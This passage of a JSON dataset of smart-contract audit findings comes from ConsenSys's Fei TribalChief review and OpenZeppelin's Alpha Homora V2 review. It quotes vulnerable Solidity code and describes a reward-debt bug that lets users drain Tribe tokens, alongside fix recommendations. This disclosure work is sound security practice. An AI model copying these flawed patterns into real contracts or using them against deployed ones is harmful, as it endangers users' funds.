      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13346",
      "title": "TribalChief - Unlocking users' funds in a pool where a multiplier has been increased is missing",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nWhen a user deposits funds to a pool, the current multiplier in use for this pool is being stored **locally** for this deposit. The value that is used later in a withdrawal operation is the **local one**, and not the one that is changing when a `governor` calls `governorAddPoolMultiplier`. It means that a decrease in the multiplier value for a given pool does not affect users that already deposited, but an increase does. Users that had already deposited should have the right to withdraw their funds when the multiplier for their pool increases by the `governor`.\n\n\n#### Examples\n\n\n**code/contracts/staking/TribalChief.sol:L143-L158**\n\n\n\n```\nfunction governorAddPoolMultiplier(\n    uint256 \\_pid,\n    uint64 lockLength,\n    uint64 newRewardsMultiplier\n) external onlyGovernor {\n    PoolInfo storage pool = poolInfo[\\_pid];\n    uint256 currentMultiplier = rewardMultipliers[\\_pid][lockLength];\n    // if the new multplier is less than the current multiplier,\n    // then, you need to unlock the pool to allow users to withdraw\n    if (newRewardsMultiplier < currentMultiplier) {\n        pool.unlocked = true;\n    }\n    rewardMultipliers[\\_pid][lockLength] = newRewardsMultiplier;\n\n    emit LogPoolMultiplier(\\_pid, lockLength, newRewardsMultiplier);\n}\n\n```\n#### Recommendation\n\n\nReplace the `<` operator with `>` in `TribalChief` line 152.",
      "summary": "\nThis bug report concerns a problem with the smart contract `TribalChief` in the `staking` folder. The issue is that when a user deposits funds to a pool, the current multiplier in use for this pool is being stored locally for this deposit. This means that the value used later in a withdrawal operation is the local one, and not the one that is changing when a `governor` calls `governorAddPoolMultiplier`. This means that a decrease in the multiplier value for a given pool does not affect users that already deposited, but an increase does. This means that users that had already deposited do not have the right to withdraw their funds when the multiplier for their pool increases by the `governor`.\n\nThe code example provided in the report is from the `TribalChief` contract, lines 143-158. The recommendation given is to replace the `<` operator with `>` in line 152. This should ensure that users are able to withdraw their funds when the multiplier for their pool increases by the `governor`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13345",
      "title": "TribalChief - Setting the totalAllocPoint to zero shouldn’t be allowed",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\n`TribalChief.updatePool` will revert in the case `totalAllocPoint = 0`, which will essentially cause users' funds and rewards to be locked.\n\n\n#### Recommendation\n\n\n`TribalChief.add` and `TribalChief.set` should assert that `totalAllocPoint > 0`. A similar validation check should be added to `TribalChief.updatePool` as well.",
      "summary": "\nThis bug report outlines an issue with the `TribalChief.updatePool` function. This function will revert when `totalAllocPoint = 0`, which will lock up user funds and rewards. The recommendation is to add an assert to `TribalChief.add` and `TribalChief.set` that `totalAllocPoint > 0`, as well as adding a similar validation check to `TribalChief.updatePool`. This will ensure that the function does not revert when `totalAllocPoint = 0`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "13344",
      "title": "TribalChief - A wrong user.rewardDebt value is calculated during the withdrawFromDeposit function call",
      "impact": "HIGH",
      "content": "#### Description\n\n\nWhen withdrawing a single deposit, the reward debt is updated:\n\n\n**contracts/staking/TribalChief.sol:L468-L474**\n\n\n\n```\nuint128 virtualAmountDelta = uint128( ( amount \\* poolDeposit.multiplier ) / SCALE\\_FACTOR );\n\n// Effects\npoolDeposit.amount -= amount;\nuser.rewardDebt = user.rewardDebt - toSigned128(user.virtualAmount \\* pool.accTribePerShare) / toSigned128(ACC\\_TRIBE\\_PRECISION);\nuser.virtualAmount -= virtualAmountDelta;\npool.virtualTotalSupply -= virtualAmountDelta;\n\n```\nInstead of the `user.virtualAmount` in reward debt calculation, the `virtualAmountDelta`  should be used.\nBecause of that bug, the reward debt is much lower than it would be, which means that the reward itself will be much larger during the harvest.\nBy making multiple deposit-withdraw actions, any user can steal all the Tribe tokens from the contract.\n\n\n#### Recommendation\n\n\nUse the `virtualAmountDelta` instead of the `user.virtualAmount`.",
      "summary": "\nA bug has been identified in the TribalChief.sol contract which affects the reward debt calculation when withdrawing a single deposit. Currently, the `user.virtualAmount` is being used in the reward debt calculation instead of the `virtualAmountDelta`. This causes the reward debt to be much lower than it should be, resulting in a larger reward during the harvest. Furthermore, multiple deposit-withdraw actions can be used to steal all the Tribe tokens from the contract. It is recommended that the `virtualAmountDelta` be used instead of the `user.virtualAmount` in the reward debt calculation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Tribechief",
      "source_link": "https://consensys.net/diligence/audits/2021/07/fei-tribechief/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Martin Ortner",
        " David Oz Kashi\n"
      ]
    },
    {
      "id": "10888",
      "title": "[L14] Sprawling whitelist architecture",
      "impact": "LOW",
      "content": "The protocol relies extensively on whitelisting:\n\n\n* The `HomoraBank` contract maintains [three separate whitelist mappings](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L81-L83); one for tokens, one for spells, and another for users.\n* The spells, upon which the system relies to interact with external protocols, inherit from `WhitelistSpell`, such that each spell maintains its own [whitelist of supported liquidity pool tokens](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/WhitelistSpell.sol#L7).\n* The `ProxyOracle`, which the protocol places between itself and the ultimate sources of token price data, also maintains a [whitelist of supported collateral tokens](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/ProxyOracle.sol#L29). It also maintains a [mapping of oracle data](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/ProxyOracle.sol#L28), which acts as another quasi-whitelist for tokens.\n\n\nWith such a sprawling whitelist architecture, there is no single point of reference to check for protocol support of any given token. For instance, the `HomoraBank` whitelist could signal support for a token, but if the `ProxyOracle` does not *also* have support for it, then the token is not actually usable by the protocol. There is no logic to facilitate keeping these whitelists in sync with each other. Consequently, keeping the disparate whitelists in sync currently falls on the governor as a manual chore.\n\n\nConsider adding logic to unify the whitelists where possible. For example, for `HomoraBank` to whitelist a token, perhaps it should check that the token is already supported by the Oracle. For a spell to add support for a token, perhaps it should check for support with `HomoraBank`. Logic to maintain updates and removals from whitelists could also make the architecture more maintainable.\n\n\n***Update:** Partially fixed in [PR#108](https://github.com/AlphaFinanceLab/homora-v2/pull/108). The handling of the disparate whitelists is improved with some checks added when adding to a whitelist, but it is still possible for the whitelists to be out of sync. For instance, there are no checks in place for when whitelist entries are modified.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10887",
      "title": "[L13] Upgradeable contract parents not reserving space",
      "impact": "LOW",
      "content": "The [`HomoraBank` contract](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol) is intended to be upgradeable via a proxy pattern. However, its parent contracts do not have any space reserved in case they need additional storage variables added at upgrade. While `HomoraBank` itself can have additional storage slots appended in case of an upgrade, its parent contracts currently offer no such flexibility.\n\n\nTo accommodate this possibility, it is common to have a fixed-length array of full 32-bit words in each parent contract. If a parent contract needs to have storage appended, the length of the array is decremented to make room for any newly-added storage slots. Such a layout helps to accommodate unforeseen future upgrades to parent contracts without compromising the storage layout or data integrity of the child contract or the proxy using the child contract’s logic.\n\n\nConsider reserving some storage in the parent contracts of any upgradeable contracts, and using community vetted tooling such as [OpenZeppelin’s Upgrade Plugins](https://docs.openzeppelin.com/upgrades-plugins/1.x/) to assist with facilitating upgrades where possible.\n\n\n***Update:** Partially fixed in [PR#107](https://github.com/AlphaFinanceLab/homora-v2/pull/107). Space was reserved in 2 parent contracts, but not all parent contracts.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10886",
      "title": "[L12] WMasterChef can leave Sushi inaccessible",
      "impact": "LOW",
      "content": "The [`WMasterChef`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WMasterChef.sol) function [`emergencyBurn`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WMasterChef.sol#L97) burns some amount of the caller’s `WMasterChef` tokens and then withdraws the corresponding amount of liquidity provider (LP) tokens from [SushiSwap’s `MasterChef` contract](https://github.com/sushiswap/sushiswap/blob/master/contracts/MasterChef.sol). The withdrawn LP tokens are then transferred to the caller.\n\n\nThis [`withdraw`](https://github.com/sushiswap/sushiswap/blob/5d92d1ce086024cbc751f351134d4c104c2fcc21/contracts/MasterChef.sol#L256) from Sushiswap’s `MasterChef` also transfers SUSHI tokens [to the `WMasterChef` contract](https://github.com/sushiswap/sushiswap/blob/5d92d1ce086024cbc751f351134d4c104c2fcc21/contracts/MasterChef.sol#L265) – but they are not forwarded from there to the caller. Instead, `emergencyBurn` merely neglects to handle the SUSHI rewards. During and after this call to `emergencyBurn`, there exists no mechanism to withdraw any SUSHI tokens released as part of this call.\n\n\nFortunately, `emergencyBurn` is never actually called by any spell in the protocol. However given its potential to lock Sushi tokens with no recourse, consider removing the function altogether. Alternatively, consider adding functionality to deal with any SUSHI that would otherwise remain inaccessible because of this function’s current implementation.\n\n\n***Update:** Fixed in [PR#106](https://github.com/AlphaFinanceLab/homora-v2/pull/106).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10885",
      "title": "[L11] Number of oracle sources can exceed reversion threshold",
      "impact": "LOW",
      "content": "The [`AggregatorOracle`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol) facilitates the retrieval of token prices in terms of ETH from multiple sources, which it then aggregates. It then either reverts, or returns the mean or median retrieved price depending on some thresholds for deviation and the number of sources. If there are ever more than three sources for a given token, then the price retrieval function, [`getETHPx`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol#L71), will [revert](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol#L124). This effectively sets an upper bound on the number of sources per token.\n\n\nHowever, the governor can currently add an unlimited number of sources, because the [functions for adding sources for tokens](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol#L26-L54) do not take the effective upper bound of three into consideration. Given that it would be detrimental to have in excess of three sources per token, consider limiting the number of sources that can be added.\n\n\n***Update:** Fixed in [PR#105](https://github.com/AlphaFinanceLab/homora-v2/pull/105).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10884",
      "title": "[L10] The pairs mapping in BalancerSpellV1 is permanently empty",
      "impact": "LOW",
      "content": "Within the [`BalancerSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BalancerSpellV1.sol) contract, a mapping called [`pairs`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BalancerSpellV1.sol#L16) is defined, which maps from Balancer Pool addresses to the two underlying token addresses of that Balancer Pool. Within the [function `getPair`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BalancerSpellV1.sol#L27), the underlying tokens for a given Pool are looked up in the mapping, and if the entry is empty, then the [underlying tokens are fetched](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BalancerSpellV1.sol#L31) from the Pool itself. However, throughout the contract, nothing is ever added to the `pairs` mapping, meaning that it is guaranteed to be empty at all times.\n\n\nConsider updating the underlying tokens for a Pool in the mapping after fetching them, so that each Pool is only queried once. This will reduce gas costs for users and clarify the intention of the code.\n\n\n***Update:** Fixed in [PR#104](https://github.com/AlphaFinanceLab/homora-v2/pull/104).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10883",
      "title": "[L09] addLiquidityWStakingRewards doesn’t verify underlying token",
      "impact": "LOW",
      "content": "The `addLiquidityWStakingRewards` function of the [`UniswapV2SpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol) and [`BalancerSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BalancerSpellV1.sol) allows the user to provide the address of the `wstaking` contract they would like to use to wrap their liquidity provider (LP) tokens. However the function never checks that the `underlyingToken` of the `wstaking` contract provided is the appropriate LP token.\n\n\nFortunately, as the code exists now, it does ultimately revert when the function attempts to mint `wstaking` tokens without having the correct LP tokens to do so. However, this intent is not made clear, and a small change to the code could lead to an incorrect `wstaking` contract being used.\n\n\nConsider adding a check that the `wstaking` contract provided by the user is for the correct LP token.\n\n\n***Update:** Partially fixed in [PR#97](https://github.com/AlphaFinanceLab/homora-v2/pull/97). Checks were added to spells to ensure that the collateral and wstaking contracts are the same. However no checks are made to ensure that the `wstaking` provided to `addLiquidityWStakingRewards` has the correct LP token.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10882",
      "title": "[L08] Protocol does not fully support ERC20 tokens with fees",
      "impact": "LOW",
      "content": "[`WERC20`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WERC20.sol) is a wrapper for `ERC20` tokens. The [`mint` function](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WERC20.sol#L36) transfers in underlying `ERC20` tokens from a user and, in exchange, mints them some corresponding amount of `ERC1155` tokens. Because an `ERC20` may reduce the quantity of tokens transferred (by subtracting transfer fees, for instance) the quantity of tokens that are transferred are not necessarily the quantity of tokens that end up in a recipient’s balance. The `mint` function [accounts for this behavior](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WERC20.sol#L37-L39), and only mints the quantity of `ERC1155` tokens [corresponding to the actual balance increase](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WERC20.sol#L40) of `ERC20` tokens.\n\n\nThis would suggest the protocol is prepared to support `ERC20` tokens with transfer fess. However, contracts that call `mint`, such as the [`BasicSpell` contract](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BasicSpell.sol) function [`doPutCollateral`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BasicSpell.sol#L99), do not account for the potential decrease and will revert when the transferred amount and amount received are not identical.\n\n\nThe same sort of partial support is present in the [`HomoraBank` contract](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol), where the [`doBorrow` function](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L567), for instance, even [returns the result of such fee-aware computations](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L573). This return value is merely discarded however, when [`BasicSpell.doBorrow`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BasicSpell.sol#L81) leads to a call of `HomoraBank.doBorrow`, but does not itself note the actual tokens sent – again resulting in potential reversions.\n\n\nTo clarify intent and to avoid unnecessary confusion caused by the partially implemented support for such tokens, consider adding inline documentation to explain where support is intentionally lacking. Alternatively, if the desire is to fully support such tokens, then consider further building out that support.\n\n\n***Update:** Fixed in [PR#103](https://github.com/AlphaFinanceLab/homora-v2/pull/103). BalancerSpellV1 was updated to correctly handle ERC20s with fees. Additionally comments were added to `doBorrow` and `doTransmit` to explain that the `amount` parameter should not be used as the received amount. No changes were made to `doPutCollateral` and `doTakeCollateral`, Alpha stated: “The collateral tokens are LP tokens, which shouldn’t have fees on transfer (and we won’t support ones that have fees).”*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10881",
      "title": "[L07] Misleading comments",
      "impact": "LOW",
      "content": "The following comments are potentially misleading or errant:\n\n\n* Throughout [`AggregatorOracle.sol`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol) there are comments that say `maxPriceDeviation` is [measured in basis points](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol#L24). However, it is not. It is a number between `1e18` and `1.5e18`, where `1e18` is 0% price deviation accepted, and `1.5e18` is 50% price deviation accepted.\n* [Lines 127 and 128 of `ProxyOracle.sol`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/ProxyOracle.sol#L127-L128) should each say `ERC20` not `ERC1155`.\n\n\nConsider correcting these comments to improve the readability of the codebase and reduce unnecessary confusion.\n\n\n***Update:** Fixed in [PR#102](https://github.com/AlphaFinanceLab/homora-v2/pull/102).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10880",
      "title": "[L06] Not handling approve return value",
      "impact": "LOW",
      "content": "As defined in the [ERC20 Specification](https://eips.ethereum.org/EIPS/eip-20), the `approve` function returns a `bool` that signals the success of the call. However, throughout the codebase, the value returned from calls to `approve` is ignored. Examples of this are:\n\n\n* [Line 29 of `WStakingRewards`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WStakingRewards.sol#L29)\n* [Line 63 of `WMasterChef`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/wrapper/WMasterChef.sol#L63)\n\n\nIn other places in the codebase, calls to `approve` are within a `require` statement which does handle the boolean return. Examples of this are:\n\n\n* [Lines 90-92 of `IbETHRouterV2`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/IbETHRouterV2.sol#L90-L92) (this contract is out of scope).\n\n\nTo handle calls to `approve` safely, even when interacting with ERC20 implementations that, incorrectly, *do not* return a boolean, consider using the [`safeApprove` function in OpenZeppelin’s SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cec0800c541c809f883a37f2dfb91ec4c90263c5/contracts/token/ERC20/SafeERC20.sol#L36) contract for all approvals.\n\n\n***Update:** Fixed in [PR#101](https://github.com/AlphaFinanceLab/homora-v2/pull/101).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10879",
      "title": "[L05] Incorrect interface definition",
      "impact": "LOW",
      "content": "In the [`CurveOracle`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/CurveOracle.sol#L39) and [`CurveSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/CurveSpellV1.sol#L45) contracts, external calls are made to [Curve’s on-chain registry](https://etherscan.io/address/0x7D86446dDb609eD0F5f8684AcF30380a356b2B4c#code). The registry function [`get_n_coins`](https://github.com/curvefi/curve-pool-registry/blob/ed52ad5ddfdeb87d42c2eb78e2fc62af8230a868/contracts/Registry.vy#L319) is used to obtain the number of underlying tokens, which various functions use to properly iterate relevant token arrays. However, the interface being used deviates from the implementation. Specifically, the interface has the return value of this call as a single `uint`, when in reality it is an array consisting of two `uint` values – the first representing the number of “wrapped tokens” and the second representing “*all* underlying tokens”. In the case of metapools, these values may be different.\n\n\nConsider updating the interface to accurately reflect the implementation in order to avoid potential confusion, avoid unexpected behavior, and clarify the intention of the code.\n\n\n***Update:** Fixed in [PR#100](https://github.com/AlphaFinanceLab/homora-v2/pull/100).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10878",
      "title": "[L04] Before initialization, EXECUTOR returns the wrong value",
      "impact": "LOW",
      "content": "Within the [`HomoraBank` contract](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol), the [function `EXECUTOR`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L136) returns the address of the owner of the position currently being executed. If [no position is currently being executed](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L138), the function reverts and does not return a value. However, before the contract is initialized, the check for whether a position is currently executing does not work, and the function incorrectly returns the `0` address instead of reverting.\n\n\nConsider setting the initial value of [`POSITION_ID`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L67) at the top of the contract, instead of in the [`initialize` function](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L124), so that the check succeeds even before the contract is initialized.\n\n\n***Update:** Acknowledged.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10877",
      "title": "[L03] Events missing or not well indexed",
      "impact": "LOW",
      "content": "There are instances in the codebase where storage is modified, but events are not emitted. For instance, all of the functions that modify the governor and pending governor in the [`Governable` contract](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/Governable.sol).\n\n\nWhere there are events, many of their definitions are lacking indexed parameters. Some examples include:\n\n\n* The [events in `ProxyOracle`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/ProxyOracle.sol#L15-L19)\n* The [`SetRoute` event in `CoreOracle`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/CoreOracle.sol#L7)\n\n\nBecause it may be of particular interests to outside observers, consider indexing the `token` argument in events, as is done in the [`AggregatorOracle` contract](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol#L12).\n\n\nAs event emissions and properly indexed parameters assist off-chain observers watch, search, and filter on-chain activity, consider emitting events whenever on-chain storage modifications occur and consider ensuring that all events in the codebase have indexed parameters.\n\n\n***Update:** Fixed in [PR#99](https://github.com/AlphaFinanceLab/homora-v2/pull/99).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10876",
      "title": "[L02] Constants not explicitly declared",
      "impact": "LOW",
      "content": "Throughout the codebase there are many occurrences of literal values being used with unexplained meaning. This makes areas of the code more difficult to understand. Some examples include:\n\n\n* The ‘maximum integer’ `uint(-1)` used throughout the codebase.\n* The acceptable range of [`1e18` to `1.5e18`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/oracle/AggregatorOracle.sol#L60) used in `AggregatorOracle`.\n* Many literal values used [throughout `_optimalDepositA`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol#L82-L89) to calculate optimal uniswap values.\n* The literal `2**112` used throughout the contracts.\n* The literal `10000` used throughout `ProxyOracle`.\n\n\nLiteral values in the codebase without an explanation as to their meaning make the code harder to read, understand, and maintain for developers, auditors and external contributors alike. Consider defining a `constant` variable for every literal value used and giving it a clear and self-explanatory name. Additionally, for complex values, inline comments explaining how they were calculated or why they were chosen are highly recommended.\n\n\n***Update:** Partially fixed in [PR#98](https://github.com/AlphaFinanceLab/homora-v2/pull/98). Alpha added constant variables to address the second point above, but have decided to leave the others as they are.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10875",
      "title": "[L01] Spells make assumptions about underlying collateral",
      "impact": "LOW",
